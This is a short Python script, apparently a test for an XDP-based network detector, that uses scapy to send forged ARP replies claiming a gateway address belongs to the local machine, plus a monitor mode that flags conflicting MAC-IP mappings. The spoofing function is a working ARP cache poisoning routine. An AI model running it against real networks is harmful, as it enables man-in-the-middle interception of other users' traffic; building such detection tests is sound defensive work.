#!/usr/bin/env python3
"""
Simulates ARP spoofing / Man-in-the-Middle attack.
Sends fake ARP replies to poison the ARP cache.
Detection: XDP + NPU should detect duplicate MAC-IP mappings.
"""
from scapy.all import *
import sys
import time

def arp_spoof_test(target_ip="127.0.0.1", fake_ip="192.168.1.1", count=20):
    print(f"[ARP Spoof] Claiming {fake_ip} is at our MAC")
    print(f"  Target: {target_ip}")
    print(f"  Spoofed IP: {fake_ip} (pretending to be gateway)")
    print(f"  Packets: {count}")

    our_mac = get_if_hwaddr(conf.iface)

    for i in range(count):
        arp = ARP(
            op=2,
            psrc=fake_ip,
            hwsrc=our_mac,
            pdst=target_ip,
            hwdst="ff:ff:ff:ff:ff:ff"
        )
        send(arp, verbose=False)
        print(f"  [{i+1}/{count}] ARP reply: {fake_ip} is-at {our_mac}")
        time.sleep(1)

def detect_arp_anomaly(iface, timeout=30):
    print(f"\n[ARP Monitor] Watching for anomalies on {iface} ({timeout}s)")
    arp_table = {}

    def process(pkt):
        if ARP in pkt and pkt[ARP].op == 2:
            ip = pkt[ARP].psrc
            mac = pkt[ARP].hwsrc
            if ip in arp_table and arp_table[ip] != mac:
                print(f"  !! ARP CONFLICT: {ip} was {arp_table[ip]}, now {mac}")
            arp_table[ip] = mac

    sniff(filter="arp", iface=iface, prn=process, timeout=timeout, store=False)
    print(f"  ARP table observed: {len(arp_table)} entries")

if __name__ == '__main__':
    target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    gateway = sys.argv[2] if len(sys.argv) > 2 else "192.168.3.1"
    mode = sys.argv[3] if len(sys.argv) > 3 else "spoof"

    print("=== ARP Spoofing Simulation ===\n")

    if mode == "spoof":
        arp_spoof_test(target, gateway, count=10)
    elif mode == "monitor":
        detect_arp_anomaly(conf.iface, timeout=30)
    else:
        print("Usage: attack_arp_spoof.py <target> <gateway_ip> [spoof|monitor]")

    print("\n=== ARP spoof test complete ===")
